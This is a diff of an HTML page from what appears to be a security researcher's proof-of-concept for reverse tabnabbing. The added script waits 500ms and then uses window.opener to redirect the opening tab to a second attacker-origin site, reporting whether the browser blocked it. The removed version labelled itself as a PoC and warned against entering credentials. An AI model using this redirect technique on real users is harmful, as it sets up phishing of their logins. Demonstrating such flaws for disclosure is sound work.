@@ -3,17 +3,27 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>PoC - Tab Hijacked</title>
+  <title>Popup - Cross Origin Attacker</title>
 </head>
-<body style="font-family: sans-serif; text-align: center; padding: 40px; background: #ff0000; color: #ffffff;">
-  <h1>TAB HIJACKED - PoC ONLY</h1>
-  <p>If you see this page in the MAIN tab, Tab-Nabbing SUCCEEDED.</p>
-  <p>Main tab was: 0x403for.github.io (trusted)</p>
-  <p>Now main tab is: tapnabbing-bypass.netlify.app (attacker)</p>
-  <p>Changed with NO second click, only via cross-origin popup + setTimeout(500).</p>
-  <p style="background: #ffffff; color: #000000; padding: 15px; margin-top: 20px;">
-    This is a security PoC by Sarwo Edi Wibowo.<br>
-    Not a real login page. Do not enter credentials.
-  </p>
+<body style="font-family: sans-serif; text-align: center; padding: 40px; background: #ffffff;">
+  <h1>POPUP - ATTACKER ORIGIN</h1>
+  <p>Origin: tabnabbing-bypass1.netlify.app</p>
+  <p>No second click here.</p>
+  <p>Auto-hijacking main tab in 500ms via window.opener...</p>
+  <p id="o"></p>
+  <script>
+    setTimeout(function() {
+      if (window.opener) {
+        try {
+          window.opener.location = 'https://tapnabbing-bypass2.netlify.app/';
+          document.getElementById('o').innerText = 'SUCCESS: Main tab hijacked!';
+        } catch (e) {
+          document.getElementById('o').innerText = 'BLOCKED by browser: ' + e;
+        }
+      } else {
+        document.getElementById('o').innerText = 'BLOCKED: window.opener is null';
+      }
+    }, 500);
+  </script>
 </body>
 </html>
